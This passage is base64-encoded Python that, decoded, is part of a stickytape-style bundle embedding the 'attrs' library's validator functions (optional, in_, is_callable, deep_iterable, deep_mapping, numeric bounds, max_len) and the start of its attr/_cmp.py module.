V0ZSBvcHRpb25hbC4gIEFuIG9wdGlvbmFsIGF0dHJpYnV0ZSBpcyBvbmVcbiAgICB3aGljaCBjYW4gYmUgc2V0IHRvIGBgTm9uZWBgIGluIGFkZGl0aW9uIHRvIHNhdGlzZnlpbmcgdGhlIHJlcXVpcmVtZW50cyBvZlxuICAgIHRoZSBzdWItdmFsaWRhdG9yLlxuXG4gICAgOnBhcmFtIHZhbGlkYXRvcjogQSB2YWxpZGF0b3IgKG9yIGEgbGlzdCBvZiB2YWxpZGF0b3JzKSB0aGF0IGlzIHVzZWQgZm9yXG4gICAgICAgIG5vbi1gYE5vbmVgYCB2YWx1ZXMuXG4gICAgOnR5cGUgdmFsaWRhdG9yOiBjYWxsYWJsZSBvciBgbGlzdGAgb2YgY2FsbGFibGVzLlxuXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMTUuMS4wXG4gICAgLi4gdmVyc2lvbmNoYW5nZWQ6OiAxNy4xLjAgKnZhbGlkYXRvciogY2FuIGJlIGEgbGlzdCBvZiB2YWxpZGF0b3JzLlxuICAgICIiIlxuICAgIGlmIGlzaW5zdGFuY2UodmFsaWRhdG9yLCBsaXN0KTpcbiAgICAgICAgcmV0dXJuIF9PcHRpb25hbFZhbGlkYXRvcihfQW5kVmFsaWRhdG9yKHZhbGlkYXRvcikpXG4gICAgcmV0dXJuIF9PcHRpb25hbFZhbGlkYXRvcih2YWxpZGF0b3IpXG5cblxuQGF0dHJzKHJlcHI9RmFsc2UsIHNsb3RzPVRydWUsIGhhc2g9VHJ1ZSlcbmNsYXNzIF9JblZhbGlkYXRvcihvYmplY3QpOlxuICAgIG9wdGlvbnMgPSBhdHRyaWIoKVxuXG4gICAgZGVmIF9fY2FsbF9fKHNlbGYsIGluc3QsIGF0dHIsIHZhbHVlKTpcbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgaW5fb3B0aW9ucyA9IHZhbHVlIGluIHNlbGYub3B0aW9uc1xuICAgICAgICBleGNlcHQgVHlwZUVycm9yOiAgIyBlLmcuIGAxIGluICJhYmMiYFxuICAgICAgICAgICAgaW5fb3B0aW9ucyA9IEZhbHNlXG5cbiAgICAgICAgaWYgbm90IGluX29wdGlvbnM6XG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxuICAgICAgICAgICAgICAgICJcJ3tuYW1lfVwnIG11c3QgYmUgaW4ge29wdGlvbnMhcn0gKGdvdCB7dmFsdWUhcn0pIi5mb3JtYXQoXG4gICAgICAgICAgICAgICAgICAgIG5hbWU9YXR0ci5uYW1lLCBvcHRpb25zPXNlbGYub3B0aW9ucywgdmFsdWU9dmFsdWVcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICApXG5cbiAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgIHJldHVybiAiPGluXyB2YWxpZGF0b3Igd2l0aCBvcHRpb25zIHtvcHRpb25zIXJ9PiIuZm9ybWF0KFxuICAgICAgICAgICAgb3B0aW9ucz1zZWxmLm9wdGlvbnNcbiAgICAgICAgKVxuXG5cbmRlZiBpbl8ob3B0aW9ucyk6XG4gICAgIiIiXG4gICAgQSB2YWxpZGF0b3IgdGhhdCByYWlzZXMgYSBgVmFsdWVFcnJvcmAgaWYgdGhlIGluaXRpYWxpemVyIGlzIGNhbGxlZFxuICAgIHdpdGggYSB2YWx1ZSB0aGF0IGRvZXMgbm90IGJlbG9uZyBpbiB0aGUgb3B0aW9ucyBwcm92aWRlZC4gIFRoZSBjaGVjayBpc1xuICAgIHBlcmZvcm1lZCB1c2luZyBgYHZhbHVlIGluIG9wdGlvbnNgYC5cblxuICAgIDpwYXJhbSBvcHRpb25zOiBBbGxvd2VkIG9wdGlvbnMuXG4gICAgOnR5cGUgb3B0aW9uczogbGlzdCwgdHVwbGUsIGBlbnVtLkVudW1gLCAuLi5cblxuICAgIDpyYWlzZXMgVmFsdWVFcnJvcjogV2l0aCBhIGh1bWFuIHJlYWRhYmxlIGVycm9yIG1lc3NhZ2UsIHRoZSBhdHRyaWJ1dGUgKG9mXG4gICAgICAgdHlwZSBgYXR0cnMuQXR0cmlidXRlYCksIHRoZSBleHBlY3RlZCBvcHRpb25zLCBhbmQgdGhlIHZhbHVlIGl0XG4gICAgICAgZ290LlxuXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMTcuMS4wXG4gICAgIiIiXG4gICAgcmV0dXJuIF9JblZhbGlkYXRvcihvcHRpb25zKVxuXG5cbkBhdHRycyhyZXByPUZhbHNlLCBzbG90cz1GYWxzZSwgaGFzaD1UcnVlKVxuY2xhc3MgX0lzQ2FsbGFibGVWYWxpZGF0b3Iob2JqZWN0KTpcbiAgICBkZWYgX19jYWxsX18oc2VsZiwgaW5zdCwgYXR0ciwgdmFsdWUpOlxuICAgICAgICAiIiJcbiAgICAgICAgV2UgdXNlIGEgY2FsbGFibGUgY2xhc3MgdG8gYmUgYWJsZSB0byBjaGFuZ2UgdGhlIGBgX19yZXByX19gYC5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIG5vdCBjYWxsYWJsZSh2YWx1ZSk6XG4gICAgICAgICAgICBtZXNzYWdlID0gKFxuICAgICAgICAgICAgICAgICJcJ3tuYW1lfVwnIG11c3QgYmUgY2FsbGFibGUgIlxuICAgICAgICAgICAgICAgICIoZ290IHt2YWx1ZSFyfSB0aGF0IGlzIGEge2FjdHVhbCFyfSkuIlxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgcmFpc2UgTm90Q2FsbGFibGVFcnJvcihcbiAgICAgICAgICAgICAgICBtc2c9bWVzc2FnZS5mb3JtYXQoXG4gICAgICAgICAgICAgICAgICAgIG5hbWU9YXR0ci5uYW1lLCB2YWx1ZT12YWx1ZSwgYWN0dWFsPXZhbHVlLl9fY2xhc3NfX1xuICAgICAgICAgICAgICAgICksXG4gICAgICAgICAgICAgICAgdmFsdWU9dmFsdWUsXG4gICAgICAgICAgICApXG5cbiAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgIHJldHVybiAiPGlzX2NhbGxhYmxlIHZhbGlkYXRvcj4iXG5cblxuZGVmIGlzX2NhbGxhYmxlKCk6XG4gICAgIiIiXG4gICAgQSB2YWxpZGF0b3IgdGhhdCByYWlzZXMgYSBgYXR0ci5leGNlcHRpb25zLk5vdENhbGxhYmxlRXJyb3JgIGlmIHRoZVxuICAgIGluaXRpYWxpemVyIGlzIGNhbGxlZCB3aXRoIGEgdmFsdWUgZm9yIHRoaXMgcGFydGljdWxhciBhdHRyaWJ1dGVcbiAgICB0aGF0IGlzIG5vdCBjYWxsYWJsZS5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE5LjEuMFxuXG4gICAgOnJhaXNlcyBgYXR0ci5leGNlcHRpb25zLk5vdENhbGxhYmxlRXJyb3JgOiBXaXRoIGEgaHVtYW4gcmVhZGFibGUgZXJyb3JcbiAgICAgICAgbWVzc2FnZSBjb250YWluaW5nIHRoZSBhdHRyaWJ1dGUgKGBhdHRycy5BdHRyaWJ1dGVgKSBuYW1lLFxuICAgICAgICBhbmQgdGhlIHZhbHVlIGl0IGdvdC5cbiAgICAiIiJcbiAgICByZXR1cm4gX0lzQ2FsbGFibGVWYWxpZGF0b3IoKVxuXG5cbkBhdHRycyhyZXByPUZhbHNlLCBzbG90cz1UcnVlLCBoYXNoPVRydWUpXG5jbGFzcyBfRGVlcEl0ZXJhYmxlKG9iamVjdCk6XG4gICAgbWVtYmVyX3ZhbGlkYXRvciA9IGF0dHJpYih2YWxpZGF0b3I9aXNfY2FsbGFibGUoKSlcbiAgICBpdGVyYWJsZV92YWxpZGF0b3IgPSBhdHRyaWIoXG4gICAgICAgIGRlZmF1bHQ9Tm9uZSwgdmFsaWRhdG9yPW9wdGlvbmFsKGlzX2NhbGxhYmxlKCkpXG4gICAgKVxuXG4gICAgZGVmIF9fY2FsbF9fKHNlbGYsIGluc3QsIGF0dHIsIHZhbHVlKTpcbiAgICAgICAgIiIiXG4gICAgICAgIFdlIHVzZSBhIGNhbGxhYmxlIGNsYXNzIHRvIGJlIGFibGUgdG8gY2hhbmdlIHRoZSBgYF9fcmVwcl9fYGAuXG4gICAgICAgICIiIlxuICAgICAgICBpZiBzZWxmLml0ZXJhYmxlX3ZhbGlkYXRvciBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIHNlbGYuaXRlcmFibGVfdmFsaWRhdG9yKGluc3QsIGF0dHIsIHZhbHVlKVxuXG4gICAgICAgIGZvciBtZW1iZXIgaW4gdmFsdWU6XG4gICAgICAgICAgICBzZWxmLm1lbWJlcl92YWxpZGF0b3IoaW5zdCwgYXR0ciwgbWVtYmVyKVxuXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICBpdGVyYWJsZV9pZGVudGlmaWVyID0gKFxuICAgICAgICAgICAgIiJcbiAgICAgICAgICAgIGlmIHNlbGYuaXRlcmFibGVfdmFsaWRhdG9yIGlzIE5vbmVcbiAgICAgICAgICAgIGVsc2UgIiB7aXRlcmFibGUhcn0iLmZvcm1hdChpdGVyYWJsZT1zZWxmLml0ZXJhYmxlX3ZhbGlkYXRvcilcbiAgICAgICAgKVxuICAgICAgICByZXR1cm4gKFxuICAgICAgICAgICAgIjxkZWVwX2l0ZXJhYmxlIHZhbGlkYXRvciBmb3J7aXRlcmFibGVfaWRlbnRpZmllcn0iXG4gICAgICAgICAgICAiIGl0ZXJhYmxlcyBvZiB7bWVtYmVyIXJ9PiJcbiAgICAgICAgKS5mb3JtYXQoXG4gICAgICAgICAgICBpdGVyYWJsZV9pZGVudGlmaWVyPWl0ZXJhYmxlX2lkZW50aWZpZXIsXG4gICAgICAgICAgICBtZW1iZXI9c2VsZi5tZW1iZXJfdmFsaWRhdG9yLFxuICAgICAgICApXG5cblxuZGVmIGRlZXBfaXRlcmFibGUobWVtYmVyX3ZhbGlkYXRvciwgaXRlcmFibGVfdmFsaWRhdG9yPU5vbmUpOlxuICAgICIiIlxuICAgIEEgdmFsaWRhdG9yIHRoYXQgcGVyZm9ybXMgZGVlcCB2YWxpZGF0aW9uIG9mIGFuIGl0ZXJhYmxlLlxuXG4gICAgOnBhcmFtIG1lbWJlcl92YWxpZGF0b3I6IFZhbGlkYXRvciB0byBhcHBseSB0byBpdGVyYWJsZSBtZW1iZXJzXG4gICAgOnBhcmFtIGl0ZXJhYmxlX3ZhbGlkYXRvcjogVmFsaWRhdG9yIHRvIGFwcGx5IHRvIGl0ZXJhYmxlIGl0c2VsZlxuICAgICAgICAob3B0aW9uYWwpXG5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAxOS4xLjBcblxuICAgIDpyYWlzZXMgVHlwZUVycm9yOiBpZiBhbnkgc3ViLXZhbGlkYXRvcnMgZmFpbFxuICAgICIiIlxuICAgIHJldHVybiBfRGVlcEl0ZXJhYmxlKG1lbWJlcl92YWxpZGF0b3IsIGl0ZXJhYmxlX3ZhbGlkYXRvcilcblxuXG5AYXR0cnMocmVwcj1GYWxzZSwgc2xvdHM9VHJ1ZSwgaGFzaD1UcnVlKVxuY2xhc3MgX0RlZXBNYXBwaW5nKG9iamVjdCk6XG4gICAga2V5X3ZhbGlkYXRvciA9IGF0dHJpYih2YWxpZGF0b3I9aXNfY2FsbGFibGUoKSlcbiAgICB2YWx1ZV92YWxpZGF0b3IgPSBhdHRyaWIodmFsaWRhdG9yPWlzX2NhbGxhYmxlKCkpXG4gICAgbWFwcGluZ192YWxpZGF0b3IgPSBhdHRyaWIoZGVmYXVsdD1Ob25lLCB2YWxpZGF0b3I9b3B0aW9uYWwoaXNfY2FsbGFibGUoKSkpXG5cbiAgICBkZWYgX19jYWxsX18oc2VsZiwgaW5zdCwgYXR0ciwgdmFsdWUpOlxuICAgICAgICAiIiJcbiAgICAgICAgV2UgdXNlIGEgY2FsbGFibGUgY2xhc3MgdG8gYmUgYWJsZSB0byBjaGFuZ2UgdGhlIGBgX19yZXByX19gYC5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIHNlbGYubWFwcGluZ192YWxpZGF0b3IgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICBzZWxmLm1hcHBpbmdfdmFsaWRhdG9yKGluc3QsIGF0dHIsIHZhbHVlKVxuXG4gICAgICAgIGZvciBrZXkgaW4gdmFsdWU6XG4gICAgICAgICAgICBzZWxmLmtleV92YWxpZGF0b3IoaW5zdCwgYXR0ciwga2V5KVxuICAgICAgICAgICAgc2VsZi52YWx1ZV92YWxpZGF0b3IoaW5zdCwgYXR0ciwgdmFsdWVba2V5XSlcblxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgcmV0dXJuIChcbiAgICAgICAgICAgICI8ZGVlcF9tYXBwaW5nIHZhbGlkYXRvciBmb3Igb2JqZWN0cyBtYXBwaW5nIHtrZXkhcn0gdG8ge3ZhbHVlIXJ9PiJcbiAgICAgICAgKS5mb3JtYXQoa2V5PXNlbGYua2V5X3ZhbGlkYXRvciwgdmFsdWU9c2VsZi52YWx1ZV92YWxpZGF0b3IpXG5cblxuZGVmIGRlZXBfbWFwcGluZyhrZXlfdmFsaWRhdG9yLCB2YWx1ZV92YWxpZGF0b3IsIG1hcHBpbmdfdmFsaWRhdG9yPU5vbmUpOlxuICAgICIiIlxuICAgIEEgdmFsaWRhdG9yIHRoYXQgcGVyZm9ybXMgZGVlcCB2YWxpZGF0aW9uIG9mIGEgZGljdGlvbmFyeS5cblxuICAgIDpwYXJhbSBrZXlfdmFsaWRhdG9yOiBWYWxpZGF0b3IgdG8gYXBwbHkgdG8gZGljdGlvbmFyeSBrZXlzXG4gICAgOnBhcmFtIHZhbHVlX3ZhbGlkYXRvcjogVmFsaWRhdG9yIHRvIGFwcGx5IHRvIGRpY3Rpb25hcnkgdmFsdWVzXG4gICAgOnBhcmFtIG1hcHBpbmdfdmFsaWRhdG9yOiBWYWxpZGF0b3IgdG8gYXBwbHkgdG8gdG9wLWxldmVsIG1hcHBpbmdcbiAgICAgICAgYXR0cmlidXRlIChvcHRpb25hbClcblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE5LjEuMFxuXG4gICAgOnJhaXNlcyBUeXBlRXJyb3I6IGlmIGFueSBzdWItdmFsaWRhdG9ycyBmYWlsXG4gICAgIiIiXG4gICAgcmV0dXJuIF9EZWVwTWFwcGluZyhrZXlfdmFsaWRhdG9yLCB2YWx1ZV92YWxpZGF0b3IsIG1hcHBpbmdfdmFsaWRhdG9yKVxuXG5cbkBhdHRycyhyZXByPUZhbHNlLCBmcm96ZW49VHJ1ZSwgc2xvdHM9VHJ1ZSlcbmNsYXNzIF9OdW1iZXJWYWxpZGF0b3Iob2JqZWN0KTpcbiAgICBib3VuZCA9IGF0dHJpYigpXG4gICAgY29tcGFyZV9vcCA9IGF0dHJpYigpXG4gICAgY29tcGFyZV9mdW5jID0gYXR0cmliKClcblxuICAgIGRlZiBfX2NhbGxfXyhzZWxmLCBpbnN0LCBhdHRyLCB2YWx1ZSk6XG4gICAgICAgICIiIlxuICAgICAgICBXZSB1c2UgYSBjYWxsYWJsZSBjbGFzcyB0byBiZSBhYmxlIHRvIGNoYW5nZSB0aGUgYGBfX3JlcHJfX2BgLlxuICAgICAgICAiIiJcbiAgICAgICAgaWYgbm90IHNlbGYuY29tcGFyZV9mdW5jKHZhbHVlLCBzZWxmLmJvdW5kKTpcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXG4gICAgICAgICAgICAgICAgIlwne25hbWV9XCcgbXVzdCBiZSB7b3B9IHtib3VuZH06IHt2YWx1ZX0iLmZvcm1hdChcbiAgICAgICAgICAgICAgICAgICAgbmFtZT1hdHRyLm5hbWUsXG4gICAgICAgICAgICAgICAgICAgIG9wPXNlbGYuY29tcGFyZV9vcCxcbiAgICAgICAgICAgICAgICAgICAgYm91bmQ9c2VsZi5ib3VuZCxcbiAgICAgICAgICAgICAgICAgICAgdmFsdWU9dmFsdWUsXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgKVxuXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gIjxWYWxpZGF0b3IgZm9yIHgge29wfSB7Ym91bmR9PiIuZm9ybWF0KFxuICAgICAgICAgICAgb3A9c2VsZi5jb21wYXJlX29wLCBib3VuZD1zZWxmLmJvdW5kXG4gICAgICAgIClcblxuXG5kZWYgbHQodmFsKTpcbiAgICAiIiJcbiAgICBBIHZhbGlkYXRvciB0aGF0IHJhaXNlcyBgVmFsdWVFcnJvcmAgaWYgdGhlIGluaXRpYWxpemVyIGlzIGNhbGxlZFxuICAgIHdpdGggYSBudW1iZXIgbGFyZ2VyIG9yIGVxdWFsIHRvICp2YWwqLlxuXG4gICAgOnBhcmFtIHZhbDogRXhjbHVzaXZlIHVwcGVyIGJvdW5kIGZvciB2YWx1ZXNcblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIxLjMuMFxuICAgICIiIlxuICAgIHJldHVybiBfTnVtYmVyVmFsaWRhdG9yKHZhbCwgIjwiLCBvcGVyYXRvci5sdClcblxuXG5kZWYgbGUodmFsKTpcbiAgICAiIiJcbiAgICBBIHZhbGlkYXRvciB0aGF0IHJhaXNlcyBgVmFsdWVFcnJvcmAgaWYgdGhlIGluaXRpYWxpemVyIGlzIGNhbGxlZFxuICAgIHdpdGggYSBudW1iZXIgZ3JlYXRlciB0aGFuICp2YWwqLlxuXG4gICAgOnBhcmFtIHZhbDogSW5jbHVzaXZlIHVwcGVyIGJvdW5kIGZvciB2YWx1ZXNcblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIxLjMuMFxuICAgICIiIlxuICAgIHJldHVybiBfTnVtYmVyVmFsaWRhdG9yKHZhbCwgIjw9Iiwgb3BlcmF0b3IubGUpXG5cblxuZGVmIGdlKHZhbCk6XG4gICAgIiIiXG4gICAgQSB2YWxpZGF0b3IgdGhhdCByYWlzZXMgYFZhbHVlRXJyb3JgIGlmIHRoZSBpbml0aWFsaXplciBpcyBjYWxsZWRcbiAgICB3aXRoIGEgbnVtYmVyIHNtYWxsZXIgdGhhbiAqdmFsKi5cblxuICAgIDpwYXJhbSB2YWw6IEluY2x1c2l2ZSBsb3dlciBib3VuZCBmb3IgdmFsdWVzXG5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAyMS4zLjBcbiAgICAiIiJcbiAgICByZXR1cm4gX051bWJlclZhbGlkYXRvcih2YWwsICI+PSIsIG9wZXJhdG9yLmdlKVxuXG5cbmRlZiBndCh2YWwpOlxuICAgICIiIlxuICAgIEEgdmFsaWRhdG9yIHRoYXQgcmFpc2VzIGBWYWx1ZUVycm9yYCBpZiB0aGUgaW5pdGlhbGl6ZXIgaXMgY2FsbGVkXG4gICAgd2l0aCBhIG51bWJlciBzbWFsbGVyIG9yIGVxdWFsIHRvICp2YWwqLlxuXG4gICAgOnBhcmFtIHZhbDogRXhjbHVzaXZlIGxvd2VyIGJvdW5kIGZvciB2YWx1ZXNcblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIxLjMuMFxuICAgICIiIlxuICAgIHJldHVybiBfTnVtYmVyVmFsaWRhdG9yKHZhbCwgIj4iLCBvcGVyYXRvci5ndClcblxuXG5AYXR0cnMocmVwcj1GYWxzZSwgZnJvemVuPVRydWUsIHNsb3RzPVRydWUpXG5jbGFzcyBfTWF4TGVuZ3RoVmFsaWRhdG9yKG9iamVjdCk6XG4gICAgbWF4X2xlbmd0aCA9IGF0dHJpYigpXG5cbiAgICBkZWYgX19jYWxsX18oc2VsZiwgaW5zdCwgYXR0ciwgdmFsdWUpOlxuICAgICAgICAiIiJcbiAgICAgICAgV2UgdXNlIGEgY2FsbGFibGUgY2xhc3MgdG8gYmUgYWJsZSB0byBjaGFuZ2UgdGhlIGBgX19yZXByX19gYC5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIGxlbih2YWx1ZSkgPiBzZWxmLm1heF9sZW5ndGg6XG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxuICAgICAgICAgICAgICAgICJMZW5ndGggb2YgXCd7bmFtZX1cJyBtdXN0IGJlIDw9IHttYXh9OiB7bGVufSIuZm9ybWF0KFxuICAgICAgICAgICAgICAgICAgICBuYW1lPWF0dHIubmFtZSwgbWF4PXNlbGYubWF4X2xlbmd0aCwgbGVuPWxlbih2YWx1ZSlcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICApXG5cbiAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgIHJldHVybiAiPG1heF9sZW4gdmFsaWRhdG9yIGZvciB7bWF4fT4iLmZvcm1hdChtYXg9c2VsZi5tYXhfbGVuZ3RoKVxuXG5cbmRlZiBtYXhfbGVuKGxlbmd0aCk6XG4gICAgIiIiXG4gICAgQSB2YWxpZGF0b3IgdGhhdCByYWlzZXMgYFZhbHVlRXJyb3JgIGlmIHRoZSBpbml0aWFsaXplciBpcyBjYWxsZWRcbiAgICB3aXRoIGEgc3RyaW5nIG9yIGl0ZXJhYmxlIHRoYXQgaXMgbG9uZ2VyIHRoYW4gKmxlbmd0aCouXG5cbiAgICA6cGFyYW0gaW50IGxlbmd0aDogTWF4aW11bSBsZW5ndGggb2YgdGhlIHN0cmluZyBvciBpdGVyYWJsZVxuXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMjEuMy4wXG4gICAgIiIiXG4gICAgcmV0dXJuIF9NYXhMZW5ndGhWYWxpZGF0b3IobGVuZ3RoKVxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2F0dHIvX2NtcC5weScsIGInIyBTUERYLUxpY2Vuc2UtSWRlbnRpZmllcjogTUlUXG5cbmZyb20gX19mdXR1cmVfXyBpbXBvcnQgYWJzb2x1dGVfaW1wb3J0LCBkaXZpc2lvbiwgcHJpbnRfZnVuY3Rpb25cblxuaW1wb3J0IGZ1bmN0b29sc1xuXG5mcm9tIC5fY29tcGF0IGltcG9ydCBuZXdfY2xhc3NcbmZyb20gLl9tYWtlIGltcG9ydCBfbWFrZV9uZVxuXG5cbl9vcGVyYXRpb25fbmFtZXMgPSB7ImVxIjogIj09IiwgImx0IjogIjwiLCAibGUiOiAiPD0iLCAiZ3QiOiAiPiIsICJnZSI6ICI+PSJ9XG5cblxuZGVmIGNtcF91c2luZyhcbiAgICBlcT1Ob25lLFxuICAgIGx0PU5vbmUsXG4gICAgbGU9Tm9uZSxcbiAgICBndD1Ob25lLFxuICAgIGdlPU5vbmUsXG4gICAgcmVxdWlyZV9zYW1lX3R5cGU9VHJ1ZSxcbiAgICBjbGFzc19uYW1lPSJDb21wYXJhYmxlIixcbik6XG4gICAgIiIiXG4gICAgQ3JlYXRlIGEgY2xhc3MgdGhhdCBjYW4gYmUgcGFzc2VkIGludG8gYGF0dHIuaWJgXCdzIGBgZXFgYCwgYGBvcmRlcmBgLCBhbmRcbiAgICBgYGNtcGBgIGFyZ3VtZW50cyB0byBjdXN0b21pemUgZmllbGQgY29tcGFyaXNvbi5cblxuICAgIFRoZSByZXN1bHRpbmcgY2xhc3Mgd2lsbCBoYXZlIGEgZnVsbCBzZXQgb2Ygb3JkZXJpbmcgbWV0aG9kcyBpZlxuICAgIGF0IGxlYXN0IG9uZSBvZiBgYHtsdCwgbGUsIGd0LCBnZX1gYCBhbmQgYGBlcWBgICBhcmUgcHJvdmlkZWQuXG5cbiAgICA6cGFyYW0gT3B0aW9uYWxbY2FsbGFibGVdIGVxOiBgY2FsbGFibGVgIHVzZWQgdG8gZXZhbHVhdGUgZXF1YWxpdHlcbiAgICAgICAgb2YgdHdvIG9iamVjdHMuXG4gICAgOnBhcmFtIE9wdGlvbmFsW2NhbGxhYmxlXSBsdDogYGNhbGxhYmxlYCB1c2VkIHRvIGV2YWx1YXRlIHdoZXRoZXJcbiAgICAgICAgb25lIG9iamVjdCBpcyBsZXNzIHRoYW4gYW5vdGhlciBvYmplY3QuXG4gICAgOnBhcmFtIE9wdGlvbmFsW2NhbGxhYmxlXSBsZTogYGNhbGxhYmxlYCB1c2VkIHRvIGV2YWx1YXRlIHdoZXRoZXJcbiAgICAgICAgb25lIG9iamVjdCBpcyBsZXNzIHRoYW4gb3IgZXF1YWwgdG8gYW5vdGhlciBvYmplY3QuXG4gICAgOnBhcmFtIE9wdGlvbmFsW2NhbGxhYmxlXSBndDogYGNhbGxhYmxlYCB1c2VkIHRvIGV2YWx1YXRlIHdoZXRoZXJcbiAgICAgICAgb25lIG9iamVjdCBpcyBncmVhdGVyIHRoYW4gYW5vdGhlciBvYmplY3QuXG4gICAgOnBhcmFtIE9wdGlvbmFsW2NhbGxhYmxlXSBnZTogYGNhbGxhYmxlYCB1c2VkIHRvIGV2YWx1YXRlIHdoZXRoZXJcbiAgICAgICAgb25lIG9iamVjdCBpcyBncmVhdGVyIHRoYW4gb3IgZXF1YWwgdG8gYW5vdGhlciBvYmplY3QuXG5cbiAgICA6cGFyYW0gYm9vbCByZXF1aXJlX3NhbWVfdHlwZTogV2hlbiBgVHJ1ZWAsIGVxdWFsaXR5IGFuZCBvcmRlcmluZyBtZXRob2RzXG4gICAgICAgIHdpbGwgcmV0dXJuIGBOb3RJbXBsZW1lbnRlZGAgaWYgb2JqZWN0cyBhcmUgbm90IG9mIHRoZSBzYW1lIHR5cGUuXG5cbiAgICA6cGFyYW0gT3B0aW9uYWxbc3RyXSBjbGFzc19uYW1lOiBOYW1lIG9mIGNsYXNzLiBEZWZhdWx0cyB0byBcJ0NvbXBhcmFibGVcJy5cblxuICAgIFNlZSBgY29tcGFyaXNvbmAgZm9yIG1vcmUgZGV0YWlscy5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIxLjEuMFxuICAgICIiIlxuXG4gICAgYm9keSA9IHtcbiAgICAgICAgIl9fc2xvdHNfXyI6IFsidmFsdWUiXSxcbiAgICAgICAgIl9faW5pdF9fIjogX21ha2VfaW5pdCgpLFxuICAgICAgICAiX3JlcXVpcmVtZW50cyI6IFtdLFxuICAgICAgICAiX2lzX2NvbXBhcmFibGVfdG8iOiBfaXNfY29tcGFyYWJsZV90byxcbiAgICB9XG5cbiAgICAjIEFkZCBvcGVyYXRpb25zLlxuICAgIG51bV9vcmRlcl9mdW5jdGlvbnMgPSAwXG4gICAgaGFzX2VxX2Z1bmN0aW9uID0gRmFsc2VcblxuICAgIGlmIGVxIGlzIG5vdCBOb25lOlxuICAgICAgICBoYXNfZXFfZnVuY3Rpb24gPSBUcnVlXG4gICAgICAgIGJvZHlbIl9fZXFfXyJdID0gX21ha2Vfb3BlcmF0b3IoImVxIiwgZXEpXG4gICAgICAgIGJvZHlbIl9fbmVfXyJdID0gX21ha2VfbmUoKVxuXG4gICAgaWYgbHQgaXMgbm90IE5vbmU6XG4gICAgICAgIG51bV9vcmRlcl9mdW5jdGlvbnMgKz0gMVxuICAgICAgICBib2R5WyJfX2x0X18iXSA9IF9tYWtlX29wZXJhdG9yKCJsdCIsIGx0KVxuXG4gICAgaWYgbGUgaXMgbm90IE5vbmU6XG4gICAgICAgIG51bV9vcmRlcl9mdW5jdGlvbnMgKz0gMVxuICAgICAgICBib2R5WyJfX2xlX18iXSA9IF9tYWtlX29wZXJhdG9yKCJsZSIsIGxlKVxuXG4gICAgaWYgZ3QgaXMgbm90IE5vbmU6XG4gICAgICAgIG51bV9vcmRlcl9mdW5jdGlvbnMgKz0gMVxuICAgICAgICBib2R5WyJfX2d0X18iXSA9IF9tYWtlX29wZXJhdG9yKCJndCIsIGd0KVxuXG4gICAgaWYgZ2UgaXMgbm90IE5vbmU6XG4gICAgICAgIG51bV9vcmRlcl9mdW5jdGlvbnMgKz0gMVxuICAgICAgICBib2R5WyJfX2dlX18iXSA9IF9tYWtlX29wZXJhdG9yKCJnZSIsIGdlKVxuXG4gICAgdHlwZV8gPSBuZXdfY2xhc3MoY2xhc3NfbmFtZSwgKG9iamVjdCwpLCB7fSwgbGFtYmRhIG5zOiBucy51cGRhdGUoYm9keSkpXG5cbiAgICAjIEFkZCBzYW1lIHR5cGUgcmVxdWlyZW1lbnQuXG4gICAgaWYgcmVxdWlyZV9zYW1lX3R5cGU6XG4gICAgICAgIHR5cGVfLl9yZXF1aXJlbWVudHMuYXBwZW5kKF9jaGVja19zYW1lX3R5cGUpXG5cbiAgICAjIEFkZCB0b3RhbCBvcmRlcmluZyBpZiBhdCBsZWFzdCBvbmUgb3BlcmF0aW9uIHdhcyBkZWZpbmVkLlxuICAgIGlmIDAgPCBudW1fb3JkZXJfZnVuY3Rpb25zIDwgNDpcbiAgICAgICAgaWYgbm90IGhhc19lcV9mdW5jdGlvbjpcbiAgICAgICAgICAgICMgZnVuY3Rvb2xzLnRvdGFsX29yZGVyaW5nIHJlcXVpcmVzIF9fZXFfXyB0byBiZSBkZWZpbmVkLFxuICAgICAgICAgICAgIyBzbyByYWlzZSBlYXJseSBlcnJvciBoZXJlIHRvIGtlZXAgYSBuaWNlIHN0YWNrLlxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcbiAgICAgICAgICAgICAgICAiZXEgbXVzdCBiZSBkZWZpbmUgaXMgb3JkZXIgdG8gY29tcGxldGUgb3JkZXJpbmcgZnJvbSAiXG4gICAgICAgICAgICAgICAgImx0LCBsZSwgZ3QsIGdlLiJcbiAgICAgICAgICAgIClcbiAgICAgICAgdHlwZV8gPSBmdW5jdG9vbHMudG90YWxfb3JkZXJpbmcodHlwZV8pXG5cbiAgICByZXR1cm4gdHlwZV9cblxuXG5kZWYgX21ha2VfaW5pdCgpOlxuICAgICIiIlxuICAgIENyZWF0ZSBfX2luaXRfXyBtZXRob2QuXG4gICAgIiIiXG5